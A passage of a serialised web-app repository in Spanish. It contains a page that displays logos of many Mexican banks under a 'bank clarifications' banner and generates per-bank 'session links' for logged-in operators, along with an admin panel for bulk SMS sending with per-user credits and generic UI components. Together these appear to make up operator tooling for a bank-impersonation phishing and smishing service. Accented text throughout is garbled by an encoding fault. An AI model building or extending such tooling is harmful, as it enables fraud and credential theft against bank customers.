WebSocket(wsUrl);\n}\n","size_bytes":398},"client/src/pages/BankSelectionPage.tsx":{"content":"import React, { useState, useEffect, useMemo } from 'react';\nimport { useLocation } from 'wouter';\nimport { useAuth } from '@/hooks/use-auth';\nimport { useQuery } from '@tanstack/react-query';\nimport { apiRequest, getQueryFn } from '@/lib/queryClient';\nimport { useToast } from '@/hooks/use-toast';\nimport { Loader2 } from 'lucide-react';\nimport { BankType } from '@shared/schema';\n\n// Importamos los logos de los bancos\nimport banorteLogoPath from '@assets/Banorte-01.png';\nimport liverPoolLogoPath from '@assets/logo-brand-liverpool-f-c-design-acaab2087aa7319e33227c007e2d759b.png';\nimport hsbcLogoPath from '@assets/Hsbc.png';\nimport banregioLogoPath from '@assets/Banregio.png.png';\nimport invexLogoPath from '@assets/Invex.png';\nimport bancoppelLogoPath from '@assets/bancoppel.png';\nimport plataCardLogoPath from '@assets/Plata_Card_Logo.png';\nimport scotiaLogoPath from '@assets/Skotia.png';\nimport amexLogoPath from '@assets/Amex.png';\nimport bancoAztecaLogoPath from '@assets/Banco_Azteca_Logo.png';\nimport bienestarLogoPath from '@assets/Logo_Banco_del_Bienestar.png';\nimport inbursaLogoPath from '@assets/stock_images/banco_inbursa_mexico_fb7d73f6.jpg';\nimport afirmeLogoPath from '@assets/logoAfirme_1762549994047.png';\n\n// Definir mapa de logos\nconst bankLogos: Record<string, string> = {\n  [BankType.HSBC]: hsbcLogoPath,\n  [BankType.BANORTE]: banorteLogoPath,\n  [BankType.INVEX]: invexLogoPath,\n  [BankType.BANCOPPEL]: bancoppelLogoPath,\n  [BankType.LIVERPOOL]: liverPoolLogoPath,\n  [BankType.BANREGIO]: banregioLogoPath,\n  [BankType.PLATACARD]: plataCardLogoPath,\n  [BankType.SCOTIABANK]: scotiaLogoPath,\n  [BankType.AMEX]: amexLogoPath,\n  [BankType.BANCOAZTECA]: bancoAztecaLogoPath,\n  [BankType.BIENESTAR]: bienestarLogoPath,\n  [BankType.INBURSA]: inbursaLogoPath,\n  [BankType.AFIRME]: afirmeLogoPath,\n  [BankType.CITIBANAMEX]: liverPoolLogoPath, // Usar logo de Liverpool como placeholder\n  [BankType.BBVA]: liverPoolLogoPath, // Usar logo de Liverpool como placeholder\n  [BankType.BANBAJIO]: liverPoolLogoPath, // Usar logo de Liverpool como placeholder\n  [BankType.SANTANDER]: liverPoolLogoPath, // Usar logo de Liverpool como placeholder\n  [BankType.SPIN]: liverPoolLogoPath // Usar logo de Liverpool como placeholder\n};\n\n// Definir mapa de descripciones\nconst bankDescriptions: Record<string, string> = {\n  [BankType.HSBC]: \"HSBC te ofrece atenci贸n r谩pida y efectiva para resolver cualquier aclaraci贸n sobre tus transacciones.\",\n  [BankType.BANORTE]: \"Banorte est谩 a tu disposici贸n para asegurar que cada transacci贸n sea clara y justa.\",\n  [BankType.INVEX]: \"INVEX te respalda en cada paso para aclarar cualquier movimiento en tus cuentas.\",\n  [BankType.BANCOPPEL]: \"BanCoppel te ofrece soluciones eficientes para resolver cualquier duda sobre tus operaciones bancarias.\",\n  [BankType.LIVERPOOL]: \"Liverpool se compromete a brindarte un servicio de calidad para resolver tus aclaraciones.\",\n  [BankType.CITIBANAMEX]: \"Banamex te acompa帽a con soluciones confiables y 谩giles para resolver todas tus aclaraciones bancarias.\",\n  [BankType.BANREGIO]: \"Banregio est谩 comprometido con tus finanzas y te ofrece el mejor servicio para resolver tus aclaraciones.\",\n  [BankType.PLATACARD]: \"Plata Card te ofrece soluciones r谩pidas y eficientes para aclarar cualquier movimiento en tu cuenta.\",\n  [BankType.SCOTIABANK]: \"Scotiabank est谩 siempre a tu disposici贸n para atender tus dudas y aclaraciones bancarias.\",\n  [BankType.AMEX]: \"American Express te garantiza soluciones efectivas para todas tus aclaraciones bancarias.\",\n  [BankType.BANCOAZTECA]: \"Banco Azteca te acompa帽a con atenci贸n personalizada para resolver tus aclaraciones de forma r谩pida y eficiente.\",\n  [BankType.BIENESTAR]: \"Banco del Bienestar est谩 comprometido con brindarte el mejor servicio en aclaraciones bancarias.\",\n  [BankType.INBURSA]: \"Banco Inbursa te ofrece soluciones financieras confiables y 谩giles para resolver todas tus aclaraciones bancarias.\",\n  [BankType.AFIRME]: \"Afirme te brinda atenci贸n cercana y profesional para resolver tus aclaraciones bancarias con rapidez y eficiencia.\"\n};\n\nexport default function BankSelectionPage() {\n  const { user } = useAuth();\n  const [allowedBanks, setAllowedBanks] = useState<string[]>([]);\n\n  // Obtener los bancos permitidos del usuario\n  const { data: allowedBanksData, isLoading } = useQuery({\n    queryKey: ['/api/user/allowed-banks'],\n    queryFn: async () => {\n      const res = await apiRequest('GET', '/api/user/allowed-banks');\n      return await res.json();\n    },\n    enabled: !!user, // Solo ejecutar si hay usuario autenticado\n    retry: false\n  });\n\n  console.log('[BankSelection] Respuesta de bancos permitidos:', allowedBanksData);\n\n  // Determinar qu茅 bancos mostrar\n  const banksToShow = useMemo(() => {\n    if (!user) {\n      console.log('[BankSelection] No hay usuario, mostrando todos los bancos');\n      // Para usuarios no autenticados, mostrar todos los bancos disponibles\n      return Object.values(BankType).filter(bank => bank !== BankType.ALL);\n    }\n\n    if (!allowedBanksData || !(allowedBanksData as any)?.success) {\n      console.log('[BankSelection] No hay datos de bancos permitidos, mostrando todos los bancos como fallback');\n      // Si hay error obteniendo los bancos permitidos, mostrar todos como fallback\n      return Object.values(BankType).filter(bank => bank !== BankType.ALL);\n    }\n\n    const allowed = (allowedBanksData as any)?.allowedBanks || [];\n    console.log('[BankSelection] Bancos permitidos del servidor:', allowed);\n\n    return allowed;\n  }, [user, allowedBanksData]);\n\n  console.log('[BankSelection] Bancos a mostrar:', banksToShow);\n  console.log('[BankSelection] Usuario actual:', user);\n\n  const [selectedBank, setSelectedBank] = useState<BankType | null>(null);\n  const [, setLocation] = useLocation();\n  const { toast } = useToast();\n\n  const handleBankSelection = async (bankType: BankType) => {\n    if (!user) {\n      toast({\n        title: \"Acceso requerido\",\n        description: \"Debes iniciar sesi贸n para generar enlaces de sesi贸n\",\n        variant: \"destructive\"\n      });\n      try {\n        setLocation('/auth');\n      } catch (error) {\n        console.error('Error navigating to auth:', error);\n        window.location.href = '/auth';\n      }\n      return;\n    }\n\n    setSelectedBank(bankType);\n\n    try {\n      const response = await fetch(`/api/generate-link?banco=${bankType}`);\n      const data = await response.json();\n\n      if (!response.ok) {\n        throw new Error(data.error || data.message || 'Error generando enlace');\n      }\n\n      if (data.link) {\n        // Abrir el enlace generado en una nueva pesta帽a\n        window.open(data.link, '_blank');\n\n        // Redirigir al panel de administraci贸n en la pesta帽a actual\n        try {\n          setLocation('/admin');\n        } catch (error) {\n          console.error('Error navigating to admin:', error);\n          window.location.href = '/admin';\n        }\n      }\n    } catch (error: any) {\n      console.error('Error generando enlace:', error);\n      toast({\n        title: \"Error\",\n        description: error.message || \"Error al generar el enlace de sesi贸n\",\n        variant: \"destructive\"\n      });\n    } finally {\n      setSelectedBank(null);\n    }\n  };\n\n  return (\n    <div className=\"min-h-screen bg-[#f9f9f9]\">\n      <header className=\"text-center py-10 px-5\">\n        <h1 className=\"text-4xl font-bold text-gray-800\">Aclaraciones Bancarias</h1>\n        <p className=\"text-xl text-gray-600 mt-2\">Porque tu confianza es nuestra prioridad</p>\n      </header>\n\n      {isLoading ? (\n        <div className=\"flex justify-center items-center py-10\">\n          <Loader2 className=\"h-8 w-8 animate-spin text-primary\" />\n          <span className=\"ml-2\">Cargando bancos disponibles...</span>\n        </div>\n      ) : (\n        <div className=\"flex flex-wrap justify-center gap-5 px-5 py-6\">\n          {banksToShow.map((bank: string) => {\n            const logo = bankLogos[bank as keyof typeof bankLogos];\n            const description = bankDescriptions[bank as keyof typeof bankDescriptions];\n\n            return (\n              <div key={bank} className=\"bg-white rounded-lg shadow-md w-64 text-center p-5\">\n                <img \n                  src={logo} \n                  alt={bank} \n                  className=\"h-16 object-contain mx-auto mb-3\"\n                />\n                <p className=\"text-sm text-gray-700\">{description}</p>\n              </div>\n            );\n          })}\n\n          {banksToShow.length === 0 && (\n            <div className=\"bg-white rounded-lg shadow-md w-full max-w-lg text-center p-8\">\n              <h3 className=\"text-xl font-semibold mb-3 text-gray-800\">No tienes bancos asignados</h3>\n              <p className=\"text-gray-600\">\n                No se te han asignado bancos para operaciones. Contacta con el administrador para obtener acceso.\n              </p>\n            </div>\n          )}\n        </div>\n      )}\n\n      <section className=\"py-8 px-5 text-center\">\n        <h2 className=\"text-3xl font-bold text-gray-800 mb-5\">驴Qu茅 es una Aclaraci贸n Bancaria?</h2>\n        <p className=\"max-w-4xl mx-auto text-gray-600 leading-relaxed mb-5\">\n          Una aclaraci贸n bancaria es un proceso mediante el cual un cliente solicita la revisi贸n de un movimiento en su cuenta bancaria que considera incorrecto o no autorizado. Este proceso puede incluir cargos no reconocidos, errores en el saldo, o cualquier otra situaci贸n que requiera una verificaci贸n por parte del banco. Las aclaraciones bancarias son fundamentales para mantener la confianza y seguridad de los clientes en sus instituciones financieras.\n        </p>\n        <p className=\"max-w-4xl mx-auto text-gray-600 leading-relaxed\">\n          Los bancos ofrecen diferentes canales para realizar estas aclaraciones, incluyendo atenci贸n en sucursales, llamadas telef贸nicas, y plataformas en l铆nea. Es importante que los clientes act煤en r谩pidamente al detectar un problema para que el banco pueda investigar y resolver la situaci贸n lo antes posible.\n        </p>\n      </section>\n\n      <section className=\"py-8 px-5 text-center\">\n        <h2 className=\"text-3xl font-bold text-gray-800 mb-5\">Aclaraciones con Tarjetas de Cr茅dito</h2>\n        <p className=\"max-w-4xl mx-auto text-gray-600 leading-relaxed mb-6\">\n          Adem谩s de las cuentas bancarias, tambi茅n puedes realizar aclaraciones por cargos no reconocidos en tus tarjetas de cr茅dito. Este proceso es similar y generalmente requiere contactar a tu banco emisor y presentar una solicitud de aclaraci贸n.\n        </p>\n        <div className=\"flex justify-center gap-10\">\n          <img src=\"https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg\" alt=\"Visa\" className=\"h-20 w-auto\" />\n          <img src=\"https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png\" alt=\"Mastercard\" className=\"h-20 w-auto\" />\n          <img src={amexLogoPath} alt=\"American Express\" className=\"h-20 w-auto\" />\n        </div>\n      </section>\n\n      <footer className=\"bg-gray-800 text-white text-center py-4 px-3 text-sm\">\n        漏 2024 Aclaraciones Bancarias - Todos los derechos reservados.\n      </footer>\n    </div>\n  );\n}","size_bytes":11206},"client/src/components/ui/dropdown-menu.tsx":{"content":"import * as React from \"react\"\nimport * as DropdownMenuPrimitive from \"@radix-ui/react-dropdown-menu\"\nimport { Check, ChevronRight, Circle } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst DropdownMenu = DropdownMenuPrimitive.Root\n\nconst DropdownMenuTrigger = DropdownMenuPrimitive.Trigger\n\nconst DropdownMenuGroup = DropdownMenuPrimitive.Group\n\nconst DropdownMenuPortal = DropdownMenuPrimitive.Portal\n\nconst DropdownMenuSub = DropdownMenuPrimitive.Sub\n\nconst DropdownMenuRadioGroup = DropdownMenuPrimitive.RadioGroup\n\nconst DropdownMenuSubTrigger = React.forwardRef<\n  React.ElementRef<typeof DropdownMenuPrimitive.SubTrigger>,\n  React.ComponentPropsWithoutRef<typeof DropdownMenuPrimitive.SubTrigger> & {\n    inset?: boolean\n  }\n>(({ className, inset, children, ...props }, ref) => (\n  <DropdownMenuPrimitive.SubTrigger\n    ref={ref}\n    className={cn(\n      \"flex cursor-default select-none items-center rounded-sm px-2 py-1.5 text-sm outline-none focus:bg-accent data-[state=open]:bg-accent\",\n      inset && \"pl-8\",\n      className\n    )}\n    {...props}\n  >\n    {children}\n    <ChevronRight className=\"ml-auto h-4 w-4\" />\n  </DropdownMenuPrimitive.SubTrigger>\n))\nDropdownMenuSubTrigger.displayName =\n  DropdownMenuPrimitive.SubTrigger.displayName\n\nconst DropdownMenuSubContent = React.forwardRef<\n  React.ElementRef<typeof DropdownMenuPrimitive.SubContent>,\n  React.ComponentPropsWithoutRef<typeof DropdownMenuPrimitive.SubContent>\n>(({ className, ...props }, ref) => (\n  <DropdownMenuPrimitive.SubContent\n    ref={ref}\n    className={cn(\n      \"z-50 min-w-[8rem] overflow-hidden rounded-md border bg-popover p-1 text-popover-foreground shadow-lg data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2\",\n      className\n    )}\n    {...props}\n  />\n))\nDropdownMenuSubContent.displayName =\n  DropdownMenuPrimitive.SubContent.displayName\n\nconst DropdownMenuContent = React.forwardRef<\n  React.ElementRef<typeof DropdownMenuPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof DropdownMenuPrimitive.Content>\n>(({ className, sideOffset = 4, ...props }, ref) => (\n  <DropdownMenuPrimitive.Portal>\n    <DropdownMenuPrimitive.Content\n      ref={ref}\n      sideOffset={sideOffset}\n      className={cn(\n        \"z-50 min-w-[8rem] overflow-hidden rounded-md border bg-popover p-1 text-popover-foreground shadow-md data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2\",\n        className\n      )}\n      {...props}\n    />\n  </DropdownMenuPrimitive.Portal>\n))\nDropdownMenuContent.displayName = DropdownMenuPrimitive.Content.displayName\n\nconst DropdownMenuItem = React.forwardRef<\n  React.ElementRef<typeof DropdownMenuPrimitive.Item>,\n  React.ComponentPropsWithoutRef<typeof DropdownMenuPrimitive.Item> & {\n    inset?: boolean\n  }\n>(({ className, inset, ...props }, ref) => (\n  <DropdownMenuPrimitive.Item\n    ref={ref}\n    className={cn(\n      \"relative flex cursor-default select-none items-center gap-2 rounded-sm px-2 py-1.5 text-sm outline-none transition-colors focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0\",\n      inset && \"pl-8\",\n      className\n    )}\n    {...props}\n  />\n))\nDropdownMenuItem.displayName = DropdownMenuPrimitive.Item.displayName\n\nconst DropdownMenuCheckboxItem = React.forwardRef<\n  React.ElementRef<typeof DropdownMenuPrimitive.CheckboxItem>,\n  React.ComponentPropsWithoutRef<typeof DropdownMenuPrimitive.CheckboxItem>\n>(({ className, children, checked, ...props }, ref) => (\n  <DropdownMenuPrimitive.CheckboxItem\n    ref={ref}\n    className={cn(\n      \"relative flex cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none transition-colors focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50\",\n      className\n    )}\n    checked={checked}\n    {...props}\n  >\n    <span className=\"absolute left-2 flex h-3.5 w-3.5 items-center justify-center\">\n      <DropdownMenuPrimitive.ItemIndicator>\n        <Check className=\"h-4 w-4\" />\n      </DropdownMenuPrimitive.ItemIndicator>\n    </span>\n    {children}\n  </DropdownMenuPrimitive.CheckboxItem>\n))\nDropdownMenuCheckboxItem.displayName =\n  DropdownMenuPrimitive.CheckboxItem.displayName\n\nconst DropdownMenuRadioItem = React.forwardRef<\n  React.ElementRef<typeof DropdownMenuPrimitive.RadioItem>,\n  React.ComponentPropsWithoutRef<typeof DropdownMenuPrimitive.RadioItem>\n>(({ className, children, ...props }, ref) => (\n  <DropdownMenuPrimitive.RadioItem\n    ref={ref}\n    className={cn(\n      \"relative flex cursor-default select-none items-center rounded-sm py-1.5 pl-8 pr-2 text-sm outline-none transition-colors focus:bg-accent focus:text-accent-foreground data-[disabled]:pointer-events-none data-[disabled]:opacity-50\",\n      className\n    )}\n    {...props}\n  >\n    <span className=\"absolute left-2 flex h-3.5 w-3.5 items-center justify-center\">\n      <DropdownMenuPrimitive.ItemIndicator>\n        <Circle className=\"h-2 w-2 fill-current\" />\n      </DropdownMenuPrimitive.ItemIndicator>\n    </span>\n    {children}\n  </DropdownMenuPrimitive.RadioItem>\n))\nDropdownMenuRadioItem.displayName = DropdownMenuPrimitive.RadioItem.displayName\n\nconst DropdownMenuLabel = React.forwardRef<\n  React.ElementRef<typeof DropdownMenuPrimitive.Label>,\n  React.ComponentPropsWithoutRef<typeof DropdownMenuPrimitive.Label> & {\n    inset?: boolean\n  }\n>(({ className, inset, ...props }, ref) => (\n  <DropdownMenuPrimitive.Label\n    ref={ref}\n    className={cn(\n      \"px-2 py-1.5 text-sm font-semibold\",\n      inset && \"pl-8\",\n      className\n    )}\n    {...props}\n  />\n))\nDropdownMenuLabel.displayName = DropdownMenuPrimitive.Label.displayName\n\nconst DropdownMenuSeparator = React.forwardRef<\n  React.ElementRef<typeof DropdownMenuPrimitive.Separator>,\n  React.ComponentPropsWithoutRef<typeof DropdownMenuPrimitive.Separator>\n>(({ className, ...props }, ref) => (\n  <DropdownMenuPrimitive.Separator\n    ref={ref}\n    className={cn(\"-mx-1 my-1 h-px bg-muted\", className)}\n    {...props}\n  />\n))\nDropdownMenuSeparator.displayName = DropdownMenuPrimitive.Separator.displayName\n\nconst DropdownMenuShortcut = ({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLSpanElement>) => {\n  return (\n    <span\n      className={cn(\"ml-auto text-xs tracking-widest opacity-60\", className)}\n      {...props}\n    />\n  )\n}\nDropdownMenuShortcut.displayName = \"DropdownMenuShortcut\"\n\nexport {\n  DropdownMenu,\n  DropdownMenuTrigger,\n  DropdownMenuContent,\n  DropdownMenuItem,\n  DropdownMenuCheckboxItem,\n  DropdownMenuRadioItem,\n  DropdownMenuLabel,\n  DropdownMenuSeparator,\n  DropdownMenuShortcut,\n  DropdownMenuGroup,\n  DropdownMenuPortal,\n  DropdownMenuSub,\n  DropdownMenuSubContent,\n  DropdownMenuSubTrigger,\n  DropdownMenuRadioGroup,\n}\n","size_bytes":7361},"client/src/components/ui/calendar.tsx":{"content":"import * as React from \"react\"\nimport { ChevronLeft, ChevronRight } from \"lucide-react\"\nimport { DayPicker } from \"react-day-picker\"\n\nimport { cn } from \"@/lib/utils\"\nimport { buttonVariants } from \"@/components/ui/button\"\n\nexport type CalendarProps = React.ComponentProps<typeof DayPicker>\n\nfunction Calendar({\n  className,\n  classNames,\n  showOutsideDays = true,\n  ...props\n}: CalendarProps) {\n  return (\n    <DayPicker\n      showOutsideDays={showOutsideDays}\n      className={cn(\"p-3\", className)}\n      classNames={{\n        months: \"flex flex-col sm:flex-row space-y-4 sm:space-x-4 sm:space-y-0\",\n        month: \"space-y-4\",\n        caption: \"flex justify-center pt-1 relative items-center\",\n        caption_label: \"text-sm font-medium\",\n        nav: \"space-x-1 flex items-center\",\n        nav_button: cn(\n          buttonVariants({ variant: \"outline\" }),\n          \"h-7 w-7 bg-transparent p-0 opacity-50 hover:opacity-100\"\n        ),\n        nav_button_previous: \"absolute left-1\",\n        nav_button_next: \"absolute right-1\",\n        table: \"w-full border-collapse space-y-1\",\n        head_row: \"flex\",\n        head_cell:\n          \"text-muted-foreground rounded-md w-9 font-normal text-[0.8rem]\",\n        row: \"flex w-full mt-2\",\n        cell: \"h-9 w-9 text-center text-sm p-0 relative [&:has([aria-selected].day-range-end)]:rounded-r-md [&:has([aria-selected].day-outside)]:bg-accent/50 [&:has([aria-selected])]:bg-accent first:[&:has([aria-selected])]:rounded-l-md last:[&:has([aria-selected])]:rounded-r-md focus-within:relative focus-within:z-20\",\n        day: cn(\n          buttonVariants({ variant: \"ghost\" }),\n          \"h-9 w-9 p-0 font-normal aria-selected:opacity-100\"\n        ),\n        day_range_end: \"day-range-end\",\n        day_selected:\n          \"bg-primary text-primary-foreground hover:bg-primary hover:text-primary-foreground focus:bg-primary focus:text-primary-foreground\",\n        day_today: \"bg-accent text-accent-foreground\",\n        day_outside:\n          \"day-outside text-muted-foreground opacity-50 aria-selected:bg-accent/50 aria-selected:text-muted-foreground aria-selected:opacity-30\",\n        day_disabled: \"text-muted-foreground opacity-50\",\n        day_range_middle:\n          \"aria-selected:bg-accent aria-selected:text-accent-foreground\",\n        day_hidden: \"invisible\",\n        ...classNames,\n      }}\n      components={{\n        IconLeft: ({ ...props }) => <ChevronLeft className=\"h-4 w-4\" />,\n        IconRight: ({ ...props }) => <ChevronRight className=\"h-4 w-4\" />,\n      }}\n      {...props}\n    />\n  )\n}\nCalendar.displayName = \"Calendar\"\n\nexport { Calendar }\n","size_bytes":2609},"client/src/components/ui/skeleton.tsx":{"content":"import { cn } from \"@/lib/utils\"\n\nfunction Skeleton({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLDivElement>) {\n  return (\n    <div\n      className={cn(\"animate-pulse rounded-md bg-muted\", className)}\n      {...props}\n    />\n  )\n}\n\nexport { Skeleton }\n","size_bytes":261},"client/src/components/admin/SimpleQRGenerator.tsx":{"content":"import React, { useState } from 'react';\nimport { Card, CardContent, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Label } from \"@/components/ui/label\";\nimport { Input } from \"@/components/ui/input\";\nimport { Button } from \"@/components/ui/button\";\nimport { QrCode, Download, Copy, RefreshCw } from \"lucide-react\";\nimport { useToast } from \"@/hooks/use-toast\";\n\nexport function SimpleQRGenerator() {\n  const [inputText, setInputText] = useState('');\n  const [isGenerating, setIsGenerating] = useState(false);\n  const { toast } = useToast();\n\n  return (\n    <div className=\"mx-4 md:mx-6 mt-4\">\n      <Card className=\"bg-[#1e1e1e] text-white border-gray-700\">\n        <CardHeader>\n          <CardTitle className=\"flex items-center\">\n            <QrCode className=\"mr-2 h-5 w-5\" />\n            Generador de C贸digos QR\n          </CardTitle>\n        </CardHeader>\n        <CardContent>\n          <div className=\"p-8 text-white text-center\">\n            <QrCode className=\"h-20 w-20 mx-auto mb-4\" />\n            <h2 className=\"text-xl font-bold mb-4\">Generador de C贸digos QR Alfanum茅ricos</h2>\n            <p>Esta secci贸n le permite generar c贸digos QR a partir de texto alfanum茅rico para su uso en diversas funcionalidades del sistema.</p>\n            <p className=\"mt-2 text-green-400\">La funci贸n estar谩 disponible pr贸ximamente.</p>\n          </div>\n        </CardContent>\n      </Card>\n    </div>\n  );\n}","size_bytes":1425},"client/src/components/ui/avatar.tsx":{"content":"import * as React from \"react\"\nimport * as AvatarPrimitive from \"@radix-ui/react-avatar\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Avatar = React.forwardRef<\n  React.ElementRef<typeof AvatarPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof AvatarPrimitive.Root>\n>(({ className, ...props }, ref) => (\n  <AvatarPrimitive.Root\n    ref={ref}\n    className={cn(\n      \"relative flex h-10 w-10 shrink-0 overflow-hidden rounded-full\",\n      className\n    )}\n    {...props}\n  />\n))\nAvatar.displayName = AvatarPrimitive.Root.displayName\n\nconst AvatarImage = React.forwardRef<\n  React.ElementRef<typeof AvatarPrimitive.Image>,\n  React.ComponentPropsWithoutRef<typeof AvatarPrimitive.Image>\n>(({ className, ...props }, ref) => (\n  <AvatarPrimitive.Image\n    ref={ref}\n    className={cn(\"aspect-square h-full w-full\", className)}\n    {...props}\n  />\n))\nAvatarImage.displayName = AvatarPrimitive.Image.displayName\n\nconst AvatarFallback = React.forwardRef<\n  React.ElementRef<typeof AvatarPrimitive.Fallback>,\n  React.ComponentPropsWithoutRef<typeof AvatarPrimitive.Fallback>\n>(({ className, ...props }, ref) => (\n  <AvatarPrimitive.Fallback\n    ref={ref}\n    className={cn(\n      \"flex h-full w-full items-center justify-center rounded-full bg-muted\",\n      className\n    )}\n    {...props}\n  />\n))\nAvatarFallback.displayName = AvatarPrimitive.Fallback.displayName\n\nexport { Avatar, AvatarImage, AvatarFallback }\n","size_bytes":1405},"client/src/components/ui/label.tsx":{"content":"import * as React from \"react\"\nimport * as LabelPrimitive from \"@radix-ui/react-label\"\nimport { cva, type VariantProps } from \"class-variance-authority\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst labelVariants = cva(\n  \"text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70\"\n)\n\nconst Label = React.forwardRef<\n  React.ElementRef<typeof LabelPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof LabelPrimitive.Root> &\n    VariantProps<typeof labelVariants>\n>(({ className, ...props }, ref) => (\n  <LabelPrimitive.Root\n    ref={ref}\n    className={cn(labelVariants(), className)}\n    {...props}\n  />\n))\nLabel.displayName = LabelPrimitive.Root.displayName\n\nexport { Label }\n","size_bytes":710},"client/src/components/admin/SmsManagementSimple.tsx":{"content":"import { useState } from \"react\";\nimport { useQuery, useMutation, useQueryClient } from \"@tanstack/react-query\";\nimport { Button } from \"@/components/ui/button\";\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Input } from \"@/components/ui/input\";\nimport { Label } from \"@/components/ui/label\";\nimport { Textarea } from \"@/components/ui/textarea\";\nimport { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from \"@/components/ui/select\";\nimport { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from \"@/components/ui/dialog\";\nimport { Badge } from \"@/components/ui/badge\";\nimport { useToast } from \"@/hooks/use-toast\";\nimport { apiRequest } from \"@/lib/queryClient\";\nimport { MessageSquare, Users, Send, Plus, History, CreditCard, CheckCircle } from \"lucide-react\";\n\ninterface User {\n  id: number;\n  username: string;\n  role: string;\n  isActive: boolean;\n}\n\ninterface SmsHistory {\n  id: number;\n  userId: number;\n  phoneNumber: string;\n  message: string;\n  sentAt: string;\n  status: string;\n  errorMessage?: string;\n}\n\nconst SmsManagementSimple = () => {\n  const { toast } = useToast();\n  const queryClient = useQueryClient();\n  \n  // Estados locales\n  const [selectedUserId, setSelectedUserId] = useState<number | null>(null);\n  const [creditsToAdd, setCreditsToAdd] = useState<number>(0);\n  const [isSendSmsDialogOpen, setIsSendSmsDialogOpen] = useState(false);\n  \n  // Estados para el formulario de env铆o de SMS\n  const [phoneNumbers, setPhoneNumbers] = useState(\"\");\n  const [smsMessage, setSmsMessage] = useState(\"\");\n  const [prefix, setPrefix] = useState(\"+52\");\n  const [routeType, setRouteType] = useState(\"long_code\");\n\n  // Obtener lista de usuarios regulares\n  const { data: users = [] } = useQuery({\n    queryKey: ['/api/users/regular'],\n    queryFn: async () => {\n      const res = await apiRequest('GET', '/api/users/regular');\n      return await res.json();\n    }\n  });\n\n  // Obtener cr茅ditos de usuario seleccionado\n  const { data: userCredits = 0 } = useQuery({\n    queryKey: ['/api/sms/credits', selectedUserId],\n    enabled: !!selectedUserId,\n    queryFn: async () => {\n      const res = await apiRequest('GET', `/api/sms/credits/${selectedUserId}`);\n      const data = await res.json();\n      return data.credits;\n    }\n  });\n\n  // Obtener historial de SMS de usuario seleccionado\n  const { data: smsHistory = [] } = useQuery({\n    queryKey: ['/api/sms/history', selectedUserId],\n    enabled: !!selectedUserId,\n    queryFn: async () => {\n      const res = await apiRequest('GET', `/api/sms/history/${selectedUserId}`);\n      const data = await res.json();\n      return data.history;\n    }\n  });\n\n  // Mutaci贸n para agregar cr茅ditos\n  const addCreditsMutation = useMutation({\n    mutationFn: async ({ userId, amount }: { userId: number; amount: number }) => {\n      const res = await apiRequest('POST', '/api/sms/credits/add', { userId, amount });\n      return await res.json();\n    },\n    onSuccess: () => {\n      toast({\n        title: \"Cr茅ditos agregados\",\n        description: `Se han agregado ${creditsToAdd} cr茅ditos al usuario`,\n      });\n      queryClient.invalidateQueries({ queryKey: ['/api/sms/credits', selectedUserId] });\n      setCreditsToAdd(0);\n    },\n    onError: (error: any) => {\n      toast({\n        title: \"Error\",\n        description: error.message || \"Error al agregar cr茅ditos\",\n        variant: \"destructive\",\n      });\n    }\n  });\n\n  // Mutaci贸n para enviar SMS\n  const sendSmsMutation = useMutation({\n    mutationFn: async ({ phoneNumbers, message, prefix, routeType }: { phoneNumbers: string; message: string; prefix: string; routeType: string }) => {\n      const res = await apiRequest('POST', '/api/sms/send', { phoneNumbers, message, prefix, routeType });\n      return await res.json();\n    },\n    onSuccess: (data) => {\n      toast({\n        title: \"SMS enviado\",\n        description: data.message || \"El SMS se ha enviado correctamente\",\n      });\n      setIsSendSmsDialogOpen(false);\n      setPhoneNumbers(\"\");\n      setSmsMessage(\"\");\n    },\n    onError: (error: any) => {\n      toast({\n        title: \"Error\",\n        description: error.message || \"Error al enviar SMS\",\n        variant: \"destructive\",\n      });\n    }\n  });\n\n  const handleAddCredits = () => {\n    if (selectedUserId && creditsToAdd > 0) {\n      addCreditsMutation.mutate({ userId: selectedUserId, amount: creditsToAdd });\n    }\n  };\n\n  const handleSendSms = () => {\n    if (phoneNumbers.trim() && smsMessage.trim()) {\n      console.log('Enviando SMS con datos:', { phoneNumbers, message: smsMessage, prefix, routeType });\n      sendSmsMutation.mutate({ phoneNumbers, message: smsMessage, prefix, routeType });\n    } else {\n      toast({\n        title: \"Error\",\n        description: \"Debes ingresar n煤meros de tel茅fono y mensaje\",\n        variant: \"destructive\",\n      });\n    }\n  };\n\n  return (\n    <div className=\"space-y-6\">\n      <div className=\"flex items-center justify-between\">\n        <div>\n          <h2 className=\"text-2xl font-bold tracking-tight\">Sistema SMS</h2>\n          <p className=\"text-muted-foreground\">\n            Gestiona el env铆o de mensajes de texto y cr茅ditos de usuarios\n          </p>\n        </div>\n      </div>\n\n      {/* Estado de la API */}\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex 